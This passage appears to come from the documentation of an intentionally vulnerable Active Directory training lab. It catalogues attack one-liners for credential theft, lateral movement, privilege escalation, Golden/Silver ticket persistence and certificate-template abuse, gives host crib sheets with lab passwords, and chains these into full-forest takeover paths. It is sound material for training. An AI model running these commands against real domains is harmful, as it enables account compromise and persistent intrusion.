| CRED-043 | OverPTH (AES) | `Rubeus.exe asktgt /user:alice /aes256:<key> /ptt` |

### MSSQL / network / wire

| ID | Technique | One-liner |
|---|---|---|
| CRED-044 | MSSQL `xp_cmdshell` SYSTEM | `EXEC xp_cmdshell 'whoami'` (after IA-011) |
| CRED-045 | MSSQL `OPENROWSET` UNC | `SELECT * FROM OPENROWSET('SQLNCLI','...','SELECT 1')` → NTLM leak |
| CRED-046 | MSSQL linked-server hop | `EXEC ('xp_cmdshell ''whoami''') AT [dc01]` |
| CRED-047 | Wireshark NTLM + Kerberos pre-auth | `tshark -i <iface> -Y 'ntlmssp.messagetype == 0x00000003'` |
| CRED-048 | SMBv1 plaintext extraction | `tshark -i <iface> -Y 'smb && smb.cmd == 0xa2'` |
| CRED-049 | LDAP simple bind sniff | `tshark -i <iface> -Y 'ldap.bindRequest_element'` |
| CRED-050 | Kerberos AS-REQ etype 0x17 sniff | `tshark -i <iface> -Y 'kerberos.msg_type == 10'` |

### Cert / shadow-creds / key theft

| ID | Technique | One-liner |
|---|---|---|
| CRED-051 | Certificate steal from machine store | `certipy shadow auto -u alice@corp.local -p ... -account 'dc01$'` |
| CRED-052 | Shadow Credentials (msDS-KeyCredentialLink) | `certipy shadow auto -u alice -p ... -account victim` |
| CRED-053 | Golden Certificate (CA cert + key) | `certipy ca -backup -u Administrator -p ... -ca CORP-CA` |
| CRED-054 | UnPAC-the-Hash | `certipy auth -pfx alice.pfx -dc-ip 10.10.0.10` (returns NT hash) |
| CRED-055 | Certify request agent | (Pattern ESC3) |

### Miscellaneous

| ID | Technique | One-liner |
|---|---|---|
| CRED-056 | NTLMv1 downgrade | (force `LMCompatibilityLevel<3` via responder) |
| CRED-057 | NetNTLMv2 crack | `hashcat -m 5600 hashes.txt rockyou.txt` |
| CRED-058 | Wdigest cleartext (legacy) | `reg add HKLM\SYSTEM\...\Wdigest /v UseLogonCredential /t REG_DWORD /d 1` |
| CRED-059 | LAPS read | `ldapsearch ... ms-Mcs-AdmPwd` (not deployed in DVAD — placeholder ID) |
| CRED-060 | gMSA password retrieval | `nxc ldap 10.10.0.10 -u backup_op -p ... --gmsa` |
| CRED-061 | DSRM credential | (Pattern PER-007) |
| CRED-062 | Kerberos S4U2Self | `impacket-getST -spn cifs/dc01 -impersonate Administrator ...` |
| CRED-063 | UnPAC after PKINIT | `certipy auth -pfx out.pfx -dc-ip 10.10.0.10 -print` |
| CRED-064 | KrbRelayUp | (Pattern D variant) |
| CRED-065 | Cleartext password in description | `nxc ldap 10.10.0.10 -u alice -p ... --query '(description=*pass*)' description` |

---

## 16. LAT-001..035 — lateral movement catalog

Movement techniques you'll exercise once you hold a credential.

| ID | Technique | One-liner |
|---|---|---|
| LAT-001 | psexec | `impacket-psexec corp.local/Administrator:'DVADlab2024!'@10.10.0.13` |
| LAT-002 | smbexec | `impacket-smbexec corp.local/Administrator:'DVADlab2024!'@10.10.0.13` |
| LAT-003 | wmiexec | `impacket-wmiexec corp.local/Administrator:'DVADlab2024!'@10.10.0.13` |
| LAT-004 | dcomexec | `impacket-dcomexec corp.local/Administrator:'DVADlab2024!'@10.10.0.13` |
| LAT-005 | atexec (schtasks) | `impacket-atexec corp.local/Administrator:'DVADlab2024!'@10.10.0.13 'whoami'` |
| LAT-006 | winrm (5985) | `evil-winrm -i 10.10.0.13 -u Administrator -p 'DVADlab2024!'` |
| LAT-007 | winrm (5986 TLS) | `evil-winrm -i 10.10.0.13 -u Administrator -p 'DVADlab2024!' -S` |
| LAT-008 | RDP NLA bypass | `xfreerdp /v:10.10.0.100 /u:Administrator /p:'DVADlab2024!' +sec-nla` |
| LAT-009 | SSH file01 | `ssh alice@10.10.0.13` |
| LAT-010 | psexec with hash (PTH) | `impacket-psexec -hashes :<NT> Administrator@10.10.0.13` |
| LAT-011 | psexec with ticket (PTT) | `KRB5CCNAME=admin.ccache impacket-psexec -k -no-pass dc01.corp.local` |
| LAT-012 | WMI Invoke (PSRemoting) | `Invoke-Command -ComputerName file01 -ScriptBlock {whoami} -Credential $cred` |
| LAT-013 | DCOM MMC20 | `[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','10.10.0.13'))` |
| LAT-014 | SC.exe remote service | `sc \\10.10.0.13 create EvilSvc binPath= 'cmd /c calc'; sc \\10.10.0.13 start EvilSvc` |
| LAT-015 | schtasks remote | `schtasks /create /S 10.10.0.13 /TN evil /TR 'cmd /c calc' /SC ONCE /ST 23:59 /RU SYSTEM` |
| LAT-016 | Remote registry RCE | `reg add \\10.10.0.13\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Evil /d 'cmd /c calc' /f` |
| LAT-017 | WinRM-MS settings | `Set-Item WSMan:\localhost\Client\TrustedHosts '*' -Force` |
| LAT-018 | Forge service ticket (Silver) | `impacket-ticketer -nthash <svc_nt> -spn cifs/file01.corp.local Administrator` |
| LAT-019 | RBCD S4U2Proxy | (Pattern D) |
| LAT-020 | Constrained delegation S4U2Proxy | `impacket-getST -spn cifs/dc01 -impersonate Administrator corp.local/svc_legacy:...` |
| LAT-021 | Unconstrained delegation TGT capture | (Pattern W) |
| LAT-022 | KCD S4U2Self → S4U2Proxy | (Pattern D variant) |
| LAT-023 | SMB tunnel via ProxyChains | `proxychains4 -q nxc smb 10.10.0.10 -u alice -H <NT>` |
| LAT-024 | SSH SOCKS5 dynamic | `ssh -D 1080 alice@10.10.0.13` |
| LAT-025 | Chisel reverse SOCKS | `chisel server -p 8080 --reverse` (operator) |
| LAT-026 | Ligolo-ng | `./proxy -selfcert`; `./agent -connect attacker:11601 -ignore-cert` |
| LAT-027 | RPC named pipe | `wmic /node:10.10.0.13 /user:alice /password:... process call create 'cmd /c calc'` |
| LAT-028 | SMB Named Pipe (`spoolss`) | `impacket-smbserver share .; printerbug → coerce auth to share` |
| LAT-029 | NFS pivot | (write SUID bash onto NFS export → host that mounts inherits it) |
| LAT-030 | Cross-bridge via dvad-ctf→dvad-finance | (after VPS-WG, attacker is routed across all three) |
| LAT-031 | NTLM relay multi-target | `impacket-ntlmrelayx -t smb://10.10.0.13 -t smb://10.10.0.14 --no-multirelay` |
| LAT-032 | Resource hijack (admin shares) | `smbclient //10.10.0.13/ADMIN\$ -U Administrator -c put evil.exe` |
| LAT-033 | DCOM ShellWindows | `[activator]::CreateInstance([type]::GetTypeFromProgID('ShellWindows','10.10.0.13'))` |
| LAT-034 | Office macro lateral (operator) | `Outlook.Application.CreateItem(0).Send` |
| LAT-035 | RestrictedAdmin RDP PTH | `xfreerdp /v:10.10.0.100 /u:Administrator /pth:<NT> /restricted-admin` |

---

## 17. PE-001..060 — privilege escalation catalog

### Token / privilege abuse

| ID | Technique | One-liner |
|---|---|---|
| PE-001 | SeImpersonate (Juicy/Rogue/Print Spoofer) | `PrintSpoofer.exe -i -c cmd` |
| PE-002 | GodPotato | `GodPotato.exe -cmd 'cmd /c whoami'` |
| PE-003 | DCOMPotato | (operator) |
| PE-004 | SeBackup + SeRestore | `reg save HKLM\SAM sam; reg save HKLM\SYSTEM sys; impacket-secretsdump LOCAL` |
| PE-005 | SeDebug LSASS open | `mimikatz # privilege::debug; sekurlsa::logonpasswords` |
| PE-006 | SeTrustedCredManAccess | (operator) |
| PE-007 | SeLoadDriver → Capcom.sys | (operator) |
| PE-008 | SeTakeOwnership chain | `takeown /f C:\Windows\System32\config\SAM /a` |

### Misconfig

| ID | Technique | One-liner |
|---|---|---|
| PE-009 | Unquoted service path | `sc qc <svc>` → drop binary in writable path |
| PE-010 | AlwaysInstallElevated | `msiexec /quiet /i evil.msi` |
| PE-011 | Writable service binary | `sc config <svc> binPath= 'cmd /c calc'; sc start <svc>` |
| PE-012 | Writable service registry | `reg add HKLM\System\CurrentControlSet\Services\<svc> /v ImagePath /d 'cmd /c calc'` |
| PE-013 | Schedtask SYSTEM weak ACL | `Get-ScheduledTask | Where Author -eq SYSTEM` |
| PE-014 | DLL hijack writable PATH | (drop `version.dll` next to vuln EXE) |
| PE-015 | Token impersonation as svc | `incognito.exe list_tokens` |
| PE-016 | UAC bypass fodhelper | `New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name '(default)' -Value 'cmd.exe'` |
| PE-017 | UAC bypass eventvwr | `reg add HKCU\Software\Classes\mscfile\shell\open\command /d cmd.exe /f; eventvwr.exe` |
| PE-018 | UAC bypass slui | (operator) |

### AD / domain privilege

| ID | Technique | One-liner |
|---|---|---|
| PE-019 | DCSync from svc account | `impacket-secretsdump -just-dc corp.local/sync_user:'DVADlab2024!'@10.10.0.10` |
| PE-020 | AdminSDHolder GenericAll → reset DA pwd | `Set-ADAccountPassword -Identity Administrator -NewPassword (...)` |
| PE-021 | Backup Operators → DC SAM/SYSTEM | (file01 svc holds Backup Operators) |
| PE-022 | Server Operators | (operator) |
| PE-023 | Print Operators | (operator) |
| PE-024 | Schema Admins | (operator) |
| PE-025 | DnsAdmins → SYSTEM via plugin DLL | `dnscmd dc01 /config /serverlevelplugindll \\10.10.0.1\share\evil.dll` |
| PE-026 | Account Operators reset users | `Set-ADAccountPassword -Identity <victim>` |
| PE-027 | Group Policy Creator Owners → new GPO | (operator) |
| PE-028 | gMSA password read (Backup Op) | `nxc ldap ... --gmsa` |
| PE-029 | RBCD on member host | (Pattern D) |
| PE-030 | RBCD on DC | `impacket-rbcd -delegate-from evil$ -delegate-to dc01$ ...` |
| PE-031 | Constrained delegation w/ protocol transition | (Pattern A→S4U2Proxy) |
| PE-032 | KrbRelayUp local-only | (operator on member) |
| PE-033 | Shadow Credentials | (CRED-052) |

### ADCS

| IDs | Technique | One-liner |
|---|---|---|
| PE-034..PE-049 | ESC1..ESC16 | (§21 ESC cookbook) |

### Sysmisconfig / kernel

| ID | Technique | One-liner |
|---|---|---|
| PE-050 | CVE-2021-1675 PrintNightmare local | `Invoke-Nightmare -DriverName 'Pwn'` |
| PE-051 | CVE-2022-26923 Certifried | `certipy req -u attacker$ -ca CORP-CA -template Machine` |
| PE-052 | CVE-2022-21882 win32k LPE | (operator on ws01) |
| PE-053 | CVE-2023-21768 AFD LPE | (operator) |
| PE-054 | CVE-2024-21338 AppLocker driver | (operator) |
| PE-055 | Kernel driver writable ImagePath | (operator) |
| PE-056 | EFS Potato | `efspotato.exe -t cifs/dc01` |
| PE-057 | RemotePotato0 cross-session | `RemotePotato0.exe -m 0 -r 10.10.0.1` |
| PE-058 | LocalPotato | (operator) |
| PE-059 | KrbRelay → S4U → SYSTEM | (operator) |
| PE-060 | DG-Disasm sandbox (DVAD doesn't ship CG/HVCI) | (lab-only smoke test) |

---

## 18. PER-001..037 — persistence catalog

### Domain tier

| ID | Name | One-liner |
|---|---|---|
| PER-001 | Golden Ticket | `impacket-ticketer -nthash <krbtgt_nt> -domain-sid <CORP_SID> -domain corp.local Administrator` |
| PER-002 | Silver Ticket | `impacket-ticketer -nthash <svc_nt> -spn cifs/file01.corp.local Administrator` |
| PER-003 | Diamond Ticket | `Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500` |
| PER-004 | Sapphire Ticket | `Rubeus.exe golden /sapphire /aes256:<krbtgt_aes256>` |
| PER-005 | Skeleton Key | `mimikatz # misc::skeleton` |
| PER-006 | DSRM | `Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior 2` |
| PER-007 | DSRM password sync | `mimikatz # lsadump::setntlm /user:Administrator /ntlm:<NT>` |
| PER-008 | AdminSDHolder ACL backdoor | `Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder...' -Rights All -PrincipalIdentity user2` |
| PER-009 | Krbtgt ACL backdoor | (write `Replicating Directory Changes` to non-priv principal) |
| PER-010 | New DA via group write | `net group 'Domain Admins' evil_user /add /domain` |
| PER-011 | GPO start-up script | (drop `\\<dc>\SYSVOL\corp.local\Policies\<gpo>\Machine\Scripts\Startup\evil.ps1`) |
| PER-012 | Trust account hash forge | (Pattern Q) |

### Object tier

| ID | Name | One-liner |
|---|---|---|
| PER-013 | Shadow Credentials | `certipy shadow auto -u alice -p ... -account victim` |
| PER-014 | RBCD on dc01$ | `impacket-rbcd -delegate-from evil$ -delegate-to dc01$` |
| PER-015 | KeyCredentialLink on every DA | `Set-ADComputer -Identity <dc> -Add @{msDS-KeyCredentialLink=...}` |
| PER-016 | Service account NTLM swap | `impacket-changepasswd` |
| PER-017 | Pre-Win2000 compatible group | (operator) |
| PER-018 | DnsAdmins membership | `Add-ADGroupMember -Identity DnsAdmins -Members evil` |

### Cert tier

| ID | Name | One-liner |
|---|---|---|
| PER-019 | Golden Cert (CA cert + key) | `certipy ca -backup ...` then forge offline |
| PER-020 | CRL signing key abuse | `certipy ca -extract-key` |
| PER-021 | Vulnerable template re-creation | `certipy template -save-old ... -upn AnyOne` |
| PER-022 | NTAuthCertificates write | (operator) |
| PER-023 | CES/CEP webservice backdoor | (operator) |

### Host tier

| ID | Name | One-liner |
|---|---|---|
| PER-024 | Scheduled task (SYSTEM) | `schtasks /create /tn DVAD /sc onlogon /tr cmd.exe /ru SYSTEM` |
| PER-025 | WMI permanent subscription | `Set-WmiInstance -Class __EventFilter ...` |
| PER-026 | IFEO Debugger | `reg add 'HKLM\...\Image File Execution Options\sethc.exe' /v Debugger /d cmd.exe` |
| PER-027 | Sticky-keys / utilman swap | `copy /y cmd.exe utilman.exe` |
| PER-028 | Service install (autostart) | `sc create EvilSvc binPath= ...` |
| PER-029 | RunOnce / Run registry | `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Evil /d cmd.exe` |
| PER-030 | Startup folder | `copy x.lnk %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` |
| PER-031 | LSASS SSP DLL | `reg add HKLM\System\CurrentControlSet\Control\Lsa /v 'Security Packages' /d ...` |
| PER-032 | Bootkit / MBR (operator) | (DVAD doesn't ship bootkits) |
| PER-033 | LNK in writable share | `copy evil.lnk \\file01\Public$\` |
| PER-034 | Hidden user (`u$ /add`) | `net user evil$ Pass1! /add` |
| PER-035 | Domain admin via SID History | (Pattern V) |
| PER-036 | Backdoor service account password | `Set-ADAccountPassword svc_web -NewPassword (...)` |
| PER-037 | Backdoor gMSA | `Set-ADServiceAccount gmsa_file -PrincipalsAllowedToRetrieveManagedPassword 'evil$'` |

---

## 19. DF-001..040 — domain/forest compromise catalog

### Intra-forest domain compromise

| ID | Name | One-liner |
|---|---|---|
| DF-001 | DCSync krbtgt corp.local | `impacket-secretsdump -just-dc-user krbtgt corp.local/Administrator@10.10.0.10` |
| DF-002 | DCSync krbtgt eu.corp.local | `impacket-secretsdump -just-dc-user krbtgt eu.corp.local/Administrator@10.10.0.11` |
| DF-003 | Golden corp.local | (PER-001) |
| DF-004 | Golden eu.corp.local | (PER-001 with eu krbtgt) |
| DF-005 | ExtraSID child → parent | (Pattern G) |
| DF-006 | ExtraSID parent → child | (Pattern P) |
| DF-007 | Skeleton corp.local | (PER-005) |
| DF-008 | Skeleton eu.corp.local | (PER-005) |
| DF-009 | DCShadow on corp.local | `mimikatz # lsadump::dcshadow /object:... /attribute:...` |
| DF-010 | DCShadow on eu.corp.local | (same, against eu DC) |

### Cross-forest takeover

| ID | Name | One-liner |
|---|---|---|
| DF-011 | Trust ticket → finance | (Pattern Q) |
| DF-012 | Trust ticket → root.corp | (Pattern R) |
| DF-013 | FSP hijack → finance | (Pattern S) |
| DF-014 | Cross-forest Kerberoast | (Pattern T) |
| DF-015 | Cross-forest ADCS PKINIT | (Pattern U) |
| DF-016 | SID History bypass | (Pattern V) |
| DF-017 | Cross-forest unconstrained delegation | (Pattern W) |
| DF-018 | noPac cross-forest | (Pattern X) |
| DF-019 | ESC11 NTLM relay cross-forest | (Pattern Y) |
| DF-020 | Diamond cross-forest | (Pattern Z) |

### Persistence at forest tier

| ID | Name | One-liner |
|---|---|---|
| DF-021 | Golden Cert across forest | (CA cert backup; forge any UPN, any forest) |
| DF-022 | DSRM on every DC | (PER-006 ×4) |
| DF-023 | AdminSDHolder ACL in every domain | (PER-008 ×4) |
| DF-024 | Trust password swap | `nltest /sc_change_pwd:<trust>` |
| DF-025 | DCShadow forest-wide | (DF-009 against EA-priv-bearing forest) |
| DF-026 | Sapphire across forest | (PER-004) |
| DF-027 | SID History on every DA | (operator) |
| DF-028 | Cross-forest gMSA backdoor | (PER-037 in finance) |
| DF-029 | NTAuthCertificates write | (PER-022) |
| DF-030 | Configuration NC write (CN=Configuration) | (operator) |

### Cleanup detection of compromise

| ID | Name | One-liner |
|---|---|---|
| DF-031 | Reset corp krbtgt twice | (mandatory cleanup if real env) |
| DF-032 | Reset eu krbtgt twice | (same) |
| DF-033 | Reset trust keys | `netdom trust ... /resetOneSide` |
| DF-034 | Revoke compromised certs | `certutil -revoke <serial>` |
| DF-035 | Remove RBCD entries | `Set-ADComputer -Identity dc01 -Clear msDS-AllowedToActOnBehalfOfOtherIdentity` |
| DF-036 | Remove SID History | `repadmin /removelingeringobjects ...` |
| DF-037 | Re-validate trust SID filtering | `netdom trust ... /enablesidhistory:No` (DVAD ships with this OFF) |
| DF-038 | Rebuild CA | (full ADCS reinstall) |
| DF-039 | Rebuild DCs from clean backup | (operator step) |
| DF-040 | Forest recovery (last-resort) | `wbadmin start systemstaterecovery ...` |

---

## 20. Per-host crib sheets

The 8 VMs each have a distinct attack surface. These are quick references; the full host-by-host catalog lives under [`docs/hosts/`](docs/hosts/).

### 13.1 `dc01.corp.local` (10.10.0.10) — Primary DC

| Surface | Detail |
|---|---|
| Ports | 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 5986, 9389 |
| RPC pipes | `\PIPE\netlogon`, `\PIPE\samr`, `\PIPE\lsarpc`, `\PIPE\srvsvc`, `\PIPE\efsrpc` (PetitPotam), `\PIPE\spoolss` (PrinterBug), `\PIPE\drsuapi` (DCSync) |
| Shares | `SYSVOL`, `NETLOGON`, `C$`, `ADMIN$`, `IPC$` |
| Pre-loaded vulns | DoNotRequirePreAuth users, Kerberoastable SPNs, ZeroLogon (`FullSecureChannelProtection=0`), unconstrained delegation hosts visible, sync_user with DCSync rights, weak password policy (4-char minimum), SMB signing not required, LDAP signing not required, AdminSDHolder backdoor on `user2`, `krbtgt`=`KrbtgtDVAD2024!` |
| Reach from | Every subnet (DCs are at the center of every trust path) |
| Pivot value | DA here = corp/eu/finance/root via Patterns G, I, P, Q, R, V |

```bash
# Top-priority enumeration once you have any cred
impacket-secretsdump corp.local/sync_user:'DVADlab2024!'@10.10.0.10 -just-dc-user krbtgt
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --kerberoasting all --asreproast all
certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -stdout -vulnerable
rpcdump.py 10.10.0.10 | grep -E 'efsrpc|spoolss|drsuapi'
```

### 13.2 `dc01.eu.corp.local` (10.10.0.11) — Child DC

| Surface | Detail |
|---|---|
| Ports | 53, 88, 135, 389, 445, 464, 636, 3268, 3269, 5985 |
| Trust direction | Parent-child two-way transitive with `corp.local` (filtering off) |
| Pre-loaded vulns | Same baseline as parent + ExtraSID escalation surface, low-priv users that map to `corp.local` via SIDHistory |
| Pivot value | Foothold here ladders straight to corp.local via Pattern G (extra-SID 519) |

```bash
# Pattern G hot-path
impacket-secretsdump eu.corp.local/Administrator@10.10.0.11 -just-dc-user krbtgt
impacket-ticketer -nthash <eu_krbtgt> -domain-sid <EU_SID> -domain eu.corp.local \
                  -extra-sid <CORP_SID>-519 Administrator
```

### 13.3 `ca01.corp.local` (10.10.0.12) — Enterprise CA

| Surface | Detail |
|---|---|
| Ports | 80, 135, 443, 445, 593, 5985, 47001 (WSMAN), 49152+ (RPC dynamic, `ICertPassage`) |
| Web | `/certsrv/`, `/certsrv/certfnsh.asp` (ESC8 NTLM relay sink) |
| RPC | `ICertPassage` aka ICPR (ESC11 relay sink) |
| Templates | `ESC1Template`, `ESC2Template`, `ESC3Template`, `ESC4Template` (vulnerable ACL), `ESC6` (EDITF_ATTRIBUTESUBJECTALTNAME2 flag set), `ESC9`, `ESC10`, `ESC11`, `ESC13`, `ESC14`, `ESC15`, `ESC16` |
| Pre-loaded vulns | Web enrollment with NTLM (no EPA), HTTPS without ChannelBinding, ICPR with no signing, vulnerable templates listed above, CA cert + key extractable from machine store |

```bash
# Cert template triage
certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
             -ca CORP-CA -enabled -stdout -vulnerable
# Web enrol probe
curl -I 'http://10.10.0.12/certsrv/'
curl -I 'http://10.10.0.12/certsrv/certfnsh.asp'
```

### 13.4 `file01.corp.local` (10.10.0.13) — File server

| Surface | Detail |
|---|---|
| Ports | 21 (FTP anon), 22 (OpenSSH, password auth), 23 (telnet), 80 (IIS), 111+2049 (NFS), 139/445 (SMB1+SMB2), 5985, 5986 |
| Shares | `Public$` (anon RW), `Finance$` (alice RO), `HR$` (svc_hr RW), `Backup$` (Backup Operators), `IPC$` |
| NFS | `/DVAD_NFS` (no_root_squash, anon UID 65534) |
| Pre-loaded vulns | SMB1 enabled (MS17-010), SMB signing not required, NTLMv1 accepted, anonymous SMB+FTP+NFS, RBCD entry on `FILE01$`, unconstrained delegation on `svc_legacy`, gMSA `gmsa_file$` retrievable by `Backup Operators` |
| Lateral surface | SSH pivot endpoint; ProxyChains the lab from here |

```bash
# Multi-protocol triage
nxc smb 10.10.0.13 -u '' -p '' --shares
smbclient //10.10.0.13/Public -N -c 'ls'
showmount -e 10.10.0.13
curl ftp://10.10.0.13/
ssh -L 11445:10.10.0.10:445 file01@10.10.0.13   # password auth allowed
nmap --script smb-vuln-ms17-010 -p445 10.10.0.13
```

### 13.5 `sql01.corp.local` (10.10.0.14) — MSSQL

| Surface | Detail |
|---|---|
| Ports | 135, 139, 445, 1433 (MSSQL), 1434/udp (SQL Browser), 5985 |
| Logins | `sa` / `SqlServer2025!`, Windows auth allowed for `corp\alice` |
| Pre-loaded vulns | `xp_cmdshell` enabled, mixed-mode auth, CLR `UNSAFE` assemblies allowed, linked server back to `dc01` with `RPC OUT=1`, MSSQL service account has SeImpersonate (potato chain), TDS without encryption |
| Pivot value | RCE via `xp_cmdshell`; SeImpersonate → SYSTEM via JuicyPotato/RoguePotato |

```bash
# Auth + exec
impacket-mssqlclient 'sa:SqlServer2025!@10.10.0.14' -windows-auth
# In the shell:
EXEC xp_cmdshell 'whoami /priv'
EXEC ('SELECT @@version') AT [dc01.corp.local]      -- linked-server hop
```

### 13.6 `ws01.corp.local` (10.10.0.100) — Victim workstation

| Surface | Detail |
|---|---|
| Ports | 135, 139, 445, 3389 (NLA off), 5985, 5986 |
| Pre-loaded vulns | Local Administrator with shared password (LAPS NOT deployed), unquoted service path, AlwaysInstallElevated reg keys, autorun for `dvad_user`, cleartext creds in `C:\Users\Public\notes.txt`, scheduled task running as SYSTEM with weak ACL, `C:\Tools\` writable by `Authenticated Users` |
| Role | Phishing landing pad — IA-019..033 land here |

```bash
# Pivot from workstation
evil-winrm -i 10.10.0.100 -u Administrator -p 'DVADlab2024!'
# In WinRM:
whoami /priv
Get-ScheduledTask | Where {$_.Principal.UserId -eq 'SYSTEM'}
icacls C:\Tools
```

### 13.7 `dc01.finance.local` (10.20.0.10) — External-trust DC

| Surface | Detail |
|---|---|
| Trust | External (one-way? two-way? — DVAD ships two-way, SID filtering OFF) |
| Pre-loaded vulns | Trust key `TrustKey2024!`, low-priv `svc_x` mapped via FSP, vulnerable ADCS template `XForestESC1` enrollable from `corp.local` |
| Pivot value | Cross-forest patterns Q, T, U, V, X target this DC |

### 13.8 `dc01.root.corp` (10.30.0.10) — Tree-root trust DC

| Surface | Detail |
|---|---|
| Trust | Tree-root with `corp.local` (transitive, SID filtering OFF) |
| Pre-loaded vulns | Same trust-key + FSP misconfig as finance; additionally exposes `Enterprise Admins` of `root.corp` to a forged extra-SID ticket from `corp.local` |
| Pivot value | Pattern R targets this DC |

---

## 21. ESC1–ESC16 cookbook

Every numbered ESC has a working template on `ca01.corp.local`. Use `certipy find -vulnerable` to enumerate; the cookbook below shows the request/auth one-liner for each. Replace `<low>` with any low-priv principal (e.g. `alice@corp.local` / `DVADlab2024!`).

### ESC1 — ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU

```bash
certipy req  -u <low> -ca CORP-CA -template ESC1Template -upn 'Administrator@corp.local'
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
```

### ESC2 — Any Purpose EKU

```bash
certipy req  -u <low> -ca CORP-CA -template ESC2Template -upn 'Administrator@corp.local'
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
```

### ESC3 — Certificate Request Agent

```bash
certipy req  -u <low> -ca CORP-CA -template ESC3Agent
certipy req  -u <low> -ca CORP-CA -template User -on-behalf-of 'corp\Administrator' \
             -pfx <low>.pfx
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
```

### ESC4 — Vulnerable template ACL

```bash
certipy template -u <low> -template ESC4Template -save-old        # snapshot
certipy template -u <low> -template ESC4Template                  # flip to ESC1-equivalent
certipy req      -u <low> -ca CORP-CA -template ESC4Template -upn 'Administrator@corp.local'
certipy auth     -pfx administrator.pfx -dc-ip 10.10.0.10
```

### ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 on CA

```bash
certipy req -u <low> -ca CORP-CA -template User -upn 'Administrator@corp.local'
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
```

### ESC7 — Vulnerable CA ACL (ManageCA / ManageCertificates)

```bash
certipy ca -u <low> -ca CORP-CA -add-officer <low>
certipy ca -u <low> -ca CORP-CA -enable-template 'SubCA'
certipy req -u <low> -ca CORP-CA -template SubCA -upn 'Administrator@corp.local'
certipy ca -u <low> -ca CORP-CA -issue-request <request-id>
certipy req -u <low> -ca CORP-CA -retrieve <request-id>
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
```

### ESC8 — Web Enrollment NTLM Relay

```bash
sudo impacket-ntlmrelayx -t http://10.10.0.12/certsrv/certfnsh.asp \
                         --adcs --template DomainController -smb2support &
impacket-PetitPotam -u <low_user> -p <low_pw> -d corp.local 10.10.0.1 10.10.0.10
certipy auth -pfx dc01.pfx -dc-ip 10.10.0.10
```

### ESC9 — No security extension (UPN-based mapping bypass)

```bash
# Modify victim's UPN to admin, request, restore
certipy account update -u <da_cred> -user 'victim' -upn 'Administrator'
certipy req -u victim@corp.local -ca CORP-CA -template ESC9Template
certipy account update -u <da_cred> -user 'victim' -upn 'victim@corp.local'
certipy auth -pfx victim.pfx -domain corp.local
```

### ESC10 — Weak certificate mapping (StrongCertificateBindingEnforcement=0)

```bash
certipy account update -u <da_cred> -user 'victim' -upn 'Administrator@corp.local'
certipy req -u victim@corp.local -ca CORP-CA -template User
certipy auth -pfx victim.pfx -dc-ip 10.10.0.10
```

### ESC11 — RPC ICPR relay without signing

```bash
sudo impacket-ntlmrelayx -t 'rpc://ca01.corp.local' -rpc-mode ICPR \
                         -icpr-ca-name 'CORP-CA' -smb2support \
                         -template DomainController &
impacket-PetitPotam -u <low> -p <pw> -d corp.local 10.10.0.1 10.10.0.10
```

### ESC13 — Group-linked OID issuance policy

```bash
certipy req -u <low> -ca CORP-CA -template ESC13Template
# Resulting cert grants membership in a privileged group via OID linkage
certipy auth -pfx out.pfx -dc-ip 10.10.0.10
```

### ESC14 — Weak SAN parsing (URI/UPN tricks)

```bash
certipy req -u <low> -ca CORP-CA -template ESC14Template \
            -upn 'Administrator@corp.local' -sid 'S-1-5-21-...-500'
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
```

### ESC15 — schema-V1 template + EKUwu

```bash
certipy req -u <low> -ca CORP-CA -template WebServer \
            -application-policies 'Client Authentication' \
            -upn 'Administrator@corp.local'
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
```

### ESC16 — Security extension disabled domain-wide

```bash
certipy req  -u <low> -ca CORP-CA -template User
certipy auth -pfx <low>.pfx -dc-ip 10.10.0.10 \
             -username Administrator -domain corp.local
```

---

## 22. Multi-pattern pivot chains

Real assessments don't end at "domain admin on corp.local." These chains stitch 2–4 patterns together to show how DVAD's full forest mesh falls.

### Chain 1: anonymous → DA(corp) → EA(forest root) — 8 patterns

```text
IA-001 nxc null-session enum         (no creds)
    ↓
IA-006 password spray DVADlab2024!  (alice : DVADlab2024!)
    ↓
A      Kerberoast svc_web           (svc_web : Summer2023!)
    ↓
B      ADCS ESC1 → Administrator    (Administrator NT hash)
    ↓
DCSync krbtgt extraction            (krbtgt NT hash)
    ↓
H      Golden Ticket forge          (persistence on corp.local)
    ↓
R      Tree-root extra-SID 519      (DA on root.corp)
    ↓
Z      Sapphire on root.corp        (forest-wide persistence)
```

Cumulative blast radius: corp.local DA + root.corp DA + permanent Sapphire ticket on each. Time on a warm lab: ~12 minutes.

### Chain 2: phishing → workstation → coercion → DC takeover — 5 patterns

```text
IA-019 library-ms phishing             (NTLMv2 hash for dvad_user)
    ↓
A      Crack dvad_user                  (dvad_user : Spring2024!)
    ↓
J      pypykatz LSASS dump on ws01      (cached creds for alice)
    ↓
C      PetitPotam + ESC8 relay          (dc01$ cert)
    ↓
DCSync krbtgt                            (corp.local DA)
```

### Chain 3: SQL pivot → linked server → cross-forest — 6 patterns

```text
IA-011 mssqlclient sa:SqlServer2025!  (sql01 cmd exec)
    ↓
PE     SeImpersonate → SYSTEM         (NT AUTHORITY\SYSTEM on sql01)
    ↓
J      LSASS dump → svc_sql hash      (svc_sql NT)
    ↓
LinkedSrv → dc01 EXEC                 (alice creds harvested)
    ↓
T      Cross-forest Kerberoast        (svc_y@finance.local cracked)
    ↓
Q      Forge trust ticket finance     (DA on finance.local)
```

